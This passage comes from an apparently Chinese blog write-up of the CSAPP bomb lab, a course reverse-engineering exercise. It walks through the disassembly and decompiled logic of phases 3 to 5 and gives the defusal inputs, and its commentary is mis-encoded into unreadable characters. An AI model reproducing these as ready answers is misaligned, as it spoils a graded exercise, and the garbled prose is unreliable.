class="line"><span class="number">0x0000000000400f1a</span> &lt;+<span class="number">30</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400f1c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>],<span class="built_in">eax</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä½ç½®åŠ¨æ€è°ƒè¯•å¯ä»¥å‘ç°æ˜¯åé¢çš„æ•°æ®æ˜¯å¦ç­‰äºå‰é¢æ•°å­—çš„äºŒå€</p><p>é‚£ä¹ˆpayloadåº”è¯¥å°±æ˜¯1 2 4 8 16 32äº†<br>å¯ä»¥é€šè¿‡éªŒè¯</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400f43</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"> <span class="number">0x0000000000400f47</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rcx</span>,[<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line"> <span class="number">0x0000000000400f4c</span> &lt;+<span class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdx</span>,[<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line"> <span class="number">0x0000000000400f51</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x4025cf</span></span><br><span class="line"> <span class="number">0x0000000000400f56</span> &lt;+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000400f5b</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> <span class="number">0x0000000000400f60</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line"> # è¯»å…¥æ•°æ®è¦æ˜¯<span class="number">2</span>ä¸ª</span><br><span class="line"> <span class="number">0x0000000000400f63</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">jg</span>     <span class="number">0x400f6a</span> &lt;phase_3+<span class="number">39</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f65</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400f6a</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>],<span class="number">0x7</span></span><br><span class="line"> # ç¬¬ä¸€ä¸ªè¯»å…¥çš„æ•°æ®ä¸èƒ½è¶…è¿‡<span class="number">7</span></span><br><span class="line"> <span class="number">0x0000000000400f6f</span> &lt;+<span class="number">44</span>&gt;:<span class="keyword">ja</span>     <span class="number">0x400fad</span> &lt;phase_3+<span class="number">106</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f71</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line"> <span class="number">0x0000000000400f75</span> &lt;+<span class="number">50</span>&gt;:<span class="keyword">jmp</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>*<span class="number">8</span></span><br><span class="line"> +<span class="number">0x402470</span>]</span><br><span class="line"> # å¯»å€åˆ°ä¸åŒçš„åˆ†æ”¯</span><br><span class="line"> <span class="number">0x0000000000400f7c</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0xcf</span></span><br><span class="line"> <span class="number">0x0000000000400f81</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f83</span> &lt;+<span class="number">64</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x2c3</span></span><br><span class="line"> <span class="number">0x0000000000400f88</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f8a</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x100</span></span><br><span class="line"> <span class="number">0x0000000000400f8f</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f91</span> &lt;+<span class="number">78</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x185</span></span><br><span class="line"> <span class="number">0x0000000000400f96</span> &lt;+<span class="number">83</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f98</span> &lt;+<span class="number">85</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0xce</span></span><br><span class="line"> <span class="number">0x0000000000400f9d</span> &lt;+<span class="number">90</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f9f</span> &lt;+<span class="number">92</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x2aa</span></span><br><span class="line"> <span class="number">0x0000000000400fa4</span> &lt;+<span class="number">97</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fa6</span> &lt;+<span class="number">99</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x147</span></span><br><span class="line"> <span class="number">0x0000000000400fab</span> &lt;+<span class="number">104</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fad</span> &lt;+<span class="number">106</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400fb2</span> &lt;+<span class="number">111</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000400fb7</span> &lt;+<span class="number">116</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fb9</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x137</span></span><br><span class="line"> <span class="number">0x0000000000400fbe</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line"> <span class="number">0x0000000000400fc2</span> &lt;+<span class="number">127</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400fc9</span> &lt;phase_3+<span class="number">134</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fc4</span> &lt;+<span class="number">129</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400fc9</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"> <span class="number">0x0000000000400fcd</span> &lt;+<span class="number">138</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>ç›®æµ‹çœ‹èµ·æ¥åƒä¸ªSwitchç»“æ„ï¼Œå…³é”®ç‚¹ç»™å‡ºæ³¨é‡Šï¼Œä¸­é—´é€šè¿‡è¯»å…¥çš„æ•°å­—åˆ°eaxé‡Œé¢è¿›è¡Œå¯»å€<br>æ¯”å¦‚æˆ‘è¦è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯7ï¼Œé‚£ä¹ˆæŸ¥çœ‹åœ°å€å¦‚ä¸‹<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/wx <span class="number">0x4024a8</span></span><br><span class="line"><span class="number">0x4024a8</span>:<span class="number">0x00400fa6</span></span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°ä¼šæ‰§è¡Œ<code>mov eax,0x147</code>ï¼Œç„¶åjmpåˆ°cmpæŒ‡ä»¤ï¼Œå°†sscanfè¯»å…¥çš„ç¬¬äºŒä¸ªå‚æ•°å’Œè¯¥å‚æ•°ç›¸æ¯”è¾ƒï¼Œé‚£ä¹ˆç¬¬äºŒä¸ªæˆ‘ä»¬è¾“å…¥0x147å³å¯é€šè¿‡éªŒè¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">7 327</span><br><span class="line">Halfway there!</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æˆªæ­¢åˆ°ç›®å‰çš„ç¨‹åºè¾“å‡º</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">   <span class="number">0x000000000040100c</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401010</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rcx</span>,[<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0000000000401015</span> &lt;+<span class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdx</span>,[<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x000000000040101a</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x4025cf</span></span><br><span class="line">   <span class="number">0x000000000040101f</span> &lt;+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401024</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   <span class="number">0x0000000000401029</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x2</span></span><br><span class="line">   <span class="number">0x000000000040102c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401035</span> &lt;phase_4+<span class="number">41</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040102e</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>],<span class="number">0xe</span></span><br><span class="line">   # ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦å°äº<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x0000000000401033</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">jbe</span>    <span class="number">0x40103a</span> &lt;phase_4+<span class="number">46</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401035</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x000000000040103a</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x000000000040103f</span> &lt;+<span class="number">51</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401044</span> &lt;+<span class="number">56</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edi</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0000000000401048</span> &lt;+<span class="number">60</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line">   # è°ƒç”¨func4å‡½æ•°ç»§ç»­å¤„ç†ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯<span class="number">0</span>ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x000000000040104d</span> &lt;+<span class="number">65</span>&gt;:<span class="keyword">test</span>   <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x000000000040104f</span> &lt;+<span class="number">67</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401058</span> &lt;phase_4+<span class="number">76</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401051</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xc</span>],<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401056</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">je</span>     <span class="number">0x40105d</span> &lt;phase_4+<span class="number">81</span>&gt;</span><br><span class="line">   # è¿”å›å€¼å’Œç¬¬äºŒä¸ªå‚æ•°éƒ½å¿…é¡»ä¸º<span class="number">0</span></span><br><span class="line">   <span class="number">0x0000000000401058</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x000000000040105d</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401061</span> &lt;+<span class="number">85</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿˜æ˜¯å¸¸è§„çš„é¦–å…ˆæ¯”è¾ƒå‚æ•°ä¸ªæ•°ï¼Œéœ€è¦ä¸¤ä¸ªï¼Œå¹¶ä¸”ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦ä¸èƒ½å¤§äº0xe</p><p>func4å‡½æ•°å¦‚ä¸‹<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400fce</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x0000000000400fd2</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"> # <span class="number">0xe</span></span><br><span class="line"><span class="number">0x0000000000400fd4</span> &lt;+<span class="number">6</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="built_in">esi</span></span><br><span class="line"><span class="number">0x0000000000400fd6</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400fd8</span> &lt;+<span class="number">10</span>&gt;:<span class="keyword">shr</span>    <span class="built_in">ecx</span>,<span class="number">0x1f</span></span><br><span class="line"><span class="number">0x0000000000400fdb</span> &lt;+<span class="number">13</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="number">0x0000000000400fdd</span> &lt;+<span class="number">15</span>&gt;:<span class="keyword">sar</span>    <span class="built_in">eax</span>,<span class="number">1</span></span><br><span class="line"><span class="number">0x0000000000400fdf</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">ecx</span>,[<span class="built_in">rax</span>+<span class="built_in">rsi</span>*<span class="number">1</span>]</span><br><span class="line"><span class="number">0x0000000000400fe2</span> &lt;+<span class="number">20</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="built_in">edi</span></span><br><span class="line"># ç¬¬ä¸€è½®å¾ªç¯ï¼š<span class="built_in">ecx</span> = (<span class="number">0xe</span> &gt;&gt; <span class="number">0x1f</span> + <span class="number">0xe</span>) &gt;&gt; <span class="number">1</span>ï¼Œç„¶åå’Œæˆ‘ä»¬è¾“å…¥çš„ç¬¬äºŒä¸ªå‚æ•°æ¯”è¾ƒ</span><br><span class="line"><span class="number">0x0000000000400fe4</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x400ff2</span> &lt;func4+<span class="number">36</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400fe6</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">rcx</span>-<span class="number">0x1</span>]</span><br><span class="line"># ç¬¬ä¸‰ä¸ªå‚æ•°ï¼š[<span class="built_in">rcx</span>-<span class="number">1</span>]</span><br><span class="line"><span class="number">0x0000000000400fe9</span> &lt;+<span class="number">27</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x0000000000400fee</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400ff0</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ff2</span> &lt;+<span class="number">36</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x0000000000400ff7</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0x0000000000400ff9</span> &lt;+<span class="number">43</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ffb</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">esi</span>,[<span class="built_in">rcx</span>+<span class="number">0x1</span>]    </span><br><span class="line"><span class="number">0x0000000000400ffe</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x0000000000401003</span> &lt;+<span class="number">53</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">rax</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x1</span>]</span><br><span class="line"><span class="number">0x0000000000401007</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x000000000040100b</span> &lt;+<span class="number">61</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p><p>ä¸€ä¸ªé€’å½’å‡½æ•°ï¼Œæœ‰ç‚¹ç»•ã€‚ã€‚ã€‚<br>å€ŸåŠ©ä¸€ä¸‹ida - - (æˆ‘å¥½èœ<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">func4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = (a3 - a2) / <span class="number">2</span> + a2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * func4(a1, a2, (v3 - <span class="number">1</span>));</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; a1 )</span><br><span class="line">    result = <span class="number">2</span> * func4(a1, (v3 + <span class="number">1</span>), a3) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¾ˆæ¸…æ™°ï¼Œä¸èƒ½å¤§äºä¸èƒ½å°äºï¼Œå¿…é¡»ç­‰äºï¼ˆå½“ç„¶åœ¨é€’å½’ä¸­ç­‰äºä¹Ÿå¯ä»¥<br>ä»”ç»†æƒ³æƒ³ï¼Œè¿™ä¸å°±æ˜¯äºŒåˆ†æŸ¥æ‰¾å—ï¼ˆx<br>æ‰€ä»¥åªè¦èƒ½è¢«äºŒåˆ†æŸ¥æ‰¾å‘ç°çš„éƒ½å¯ä»¥</p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>æ±‡ç¼–ä»£ç å¦‚ä¸‹<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000401062</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">push</span>   <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x0000000000401063</span> &lt;+<span class="number">1</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x20</span></span><br><span class="line"><span class="number">0x0000000000401067</span> &lt;+<span class="number">5</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x000000000040106a</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:<span class="number">0x28</span></span><br><span class="line"><span class="number">0x0000000000401073</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x18</span>],<span class="built_in">rax</span></span><br><span class="line"><span class="number">0x0000000000401078</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">xor</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x000000000040107a</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40131b</span> &lt;string_length&gt;</span><br><span class="line"><span class="number">0x000000000040107f</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x6</span></span><br><span class="line"># æ¯”è¾ƒå­—ç¬¦ä¸²é•¿åº¦</span><br><span class="line"><span class="number">0x0000000000401082</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401084</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000401089</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line"><span class="number">0x000000000040108b</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">movzx</span>  <span class="built_in">ecx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="built_in">rax</span>*<span class="number">1</span>]</span><br><span class="line"><span class="number">0x000000000040108f</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>],<span class="built_in">cl</span></span><br><span class="line"><span class="number">0x0000000000401092</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>]</span><br><span class="line"><span class="number">0x0000000000401096</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">and</span>    <span class="built_in">edx</span>,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x0000000000401099</span> &lt;+<span class="number">55</span>&gt;:<span class="keyword">movzx</span>  <span class="built_in">edx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x4024b0</span>]</span><br><span class="line"><span class="number">0x00000000004010a0</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x10</span>],<span class="built_in">dl</span></span><br><span class="line"><span class="number">0x00000000004010a4</span> &lt;+<span class="number">66</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x1</span></span><br><span class="line"># æ¯æ¬¡+<span class="number">1</span></span><br><span class="line"><span class="number">0x00000000004010a8</span> &lt;+<span class="number">70</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="number">0x6</span></span><br><span class="line"># å¾ªç¯<span class="number">6</span>æ¬¡</span><br><span class="line"><span class="number">0x00000000004010ac</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010ae</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x16</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004010b3</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x40245e</span></span><br><span class="line"><span class="number">0x00000000004010b8</span> &lt;+<span class="number">86</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdi</span>,[<span class="built_in">rsp</span>+<span class="number">0x10</span>]</span><br><span class="line"><span class="number">0x00000000004010bd</span> &lt;+<span class="number">91</span>&gt;:<span class="keyword">call</span>   <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line"><span class="number">0x00000000004010c2</span> &lt;+<span class="number">96</span>&gt;:<span class="keyword">test</span>   <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x00000000004010c4</span> &lt;+<span class="number">98</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010c6</span> &lt;+<span class="number">100</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x00000000004010cb</span> &lt;+<span class="number">105</span>&gt;:<span class="keyword">nop</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x00000000004010d0</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010d2</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004010d7</span> &lt;+<span class="number">117</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010d9</span> &lt;+<span class="number">119</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x18</span>]</span><br><span class="line"><span class="number">0x00000000004010de</span> &lt;+<span class="number">124</span>&gt;:<span class="keyword">xor</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:<span class="number">0x28</span></span><br><span class="line"><span class="number">0x00000000004010e7</span> &lt;+<span class="number">133</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010ee</span> &lt;phase_5+<span class="number">140</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010e9</span> &lt;+<span class="number">135</span>&gt;:<span 